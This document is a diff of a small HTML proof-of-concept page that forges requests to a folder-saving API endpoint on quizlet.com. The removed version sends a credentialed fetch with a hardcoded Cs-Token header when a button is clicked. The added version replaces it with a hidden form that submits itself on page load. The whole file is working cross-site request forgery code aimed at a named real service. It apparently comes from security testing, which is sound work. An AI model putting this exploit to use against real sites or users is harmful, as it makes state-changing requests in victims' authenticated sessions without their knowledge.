@@ -1,40 +1,9 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h3>CSRF PoC with Cs-Token</h3>
-    <button onclick="send()">Click to send CSRF</button>
-
-    <script>
-      async function send() {
-        try {
-          const response = await fetch("https://quizlet.com/webapi/3.2/folders/save?_method=PUT", {
-            method: "POST",
-            credentials: "include",
-            headers: {
-              "Content-Type": "application/json",
-              "Cs-Token": "777KPGM3bmXwpW9PChQGyk"
-            },
-            body: JSON.stringify({
-              data: [
-                { name: "api2", description: "" }
-              ]
-            })
-          });
-
-          console.log("Response status:", response.status);
-          const text = await response.text();
-          console.log("Response body:", text);
-
-          if (!response.ok) {
-            alert(`Request failed with status ${response.status}`);
-          } else {
-            alert("Request succeeded!");
-          }
-        } catch (error) {
-          console.error("Fetch error:", error);
-          alert("Fetch error: " + error.message);
-        }
-      }
-    </script>
+  <body onload="document.forms[0].submit()">
+    <h3>Simple CSRF via auto-submitted form</h3>
+    <form method="POST" action="https://quizlet.com/webapi/3.2/folders/save?_method=PUT">
+      <input type="hidden" name="data" value='[{"name":"api2","description":""}]'>
+    </form>
   </body>
 </html>
